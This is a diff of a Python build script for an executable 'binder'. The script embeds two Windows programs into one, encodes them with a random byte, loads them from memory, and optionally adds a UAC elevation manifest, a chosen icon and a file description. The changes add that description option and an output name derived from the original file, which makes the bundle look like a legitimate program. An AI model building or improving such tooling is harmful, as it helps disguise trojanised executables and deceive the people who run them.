@@ -155,10 +155,12 @@ if __name__ == "__main__":
     parser.add_argument('--gui', action="store_true", help="Enable -mwindows CXXFLAG, works when the secondary is GUI exe file.")
     parser.add_argument('--x86', action="store_true", help="Enable -m32 CXXFLAG, when build in x64 platform.")
     parser.add_argument('--ico', type=str, help="Set bind file icon.")
-    parser.add_argument('--out', type=str, default="new.exe", help="Output binded exe file.")
+    parser.add_argument('--out', type=str, help="Output binded exe file.")
+    parser.add_argument('--desc', type=str, help="File description of output binded exe.")
 
     args = parser.parse_args()
-
+    result = False
+    out = args.out if args.out else os.path.basename(args.primary).replace(".exe", "-new.exe")
     cxxflag = "%s %s" % (str("-mwindows" if args.gui else ""), str("-m32" if args.x86 else ""))
 
     if args.ico:
@@ -173,13 +175,21 @@ if __name__ == "__main__":
         except Exception as e:
             print("Error in parsing ico: %s" % e)
 
-    os.system("windres %s --input-format=rc -O coff -i icon.rc -o icon.res" % str("-F pe-i386" if args.x86 else ""))
-    icon_flag = True if os.path.exists("icon.res") else False
+    desc = args.desc if args.desc else os.path.basename(args.secondary).replace(".exe", "")
+    with open("./res/icon.rc", "r") as ri:
+        data = ri.read()
+
+    data = data.replace("FILEDESCRIPTION", desc)
+    with open("main.rc", "w") as wi:
+        wi.write(data)
+
+    os.system("windres %s --input-format=rc -O coff -i main.rc -o main.res" % str("-F pe-i386" if args.x86 else ""))
+    icon_flag = True if os.path.exists("main.res") else False
 
     res1 = res2header(args.primary, "res1.h", chr(random.randint(0, 255)))
     res2 = res2header(args.secondary, "res2.h", chr(random.randint(0, 255)))
 
-    with open("binder.cpp", "r") as rb:
+    with open("./src/binder.cpp", "r") as rb:
         data = rb.read()
         data = data.replace("RES_1111", res1["res_name"])
         data = data.replace("RES_2222", res2["res_name"])
@@ -188,17 +198,27 @@ if __name__ == "__main__":
         wm.write(data)
 
     if args.uac:
-        os.system("windres %s --input-format=rc -O coff -i uac.rc -o uac.res" % str("-F pe-i386" if args.x86 else ""))
+        os.system("windres %s --input-format=rc -O coff -i ./res/uac.rc -o uac.res" % str("-F pe-i386" if args.x86 else ""))
 
-    os.system("g++ %s main.cpp memory_module.c %s %s -o %s" % (cxxflag, str("uac.res" if args.uac else ""), str("icon.res" if icon_flag else ""), args.out))
-    os.system("strip %s" % args.out)
-    print("Bind to %s success! " % args.out)
+    os.system("g++ %s -Isrc main.cpp ./src/memory_module.c %s %s -o %s" % (cxxflag, str("uac.res" if args.uac else ""), str("main.res" if icon_flag else ""), out))
+
+    if os.path.exists(out):
+        result = True
+        os.system("strip %s" % out)
+        print("Bind to %s success! " % out)
 
     os.remove("res1.h")
     os.remove("res2.h")
     os.remove("main.cpp")
+    os.remove("main.rc")
+
     try:
         os.remove("uac.res")
+    except:
+        pass
+
+    try:
+        os.remove("main.res")
     except:
         pass
 
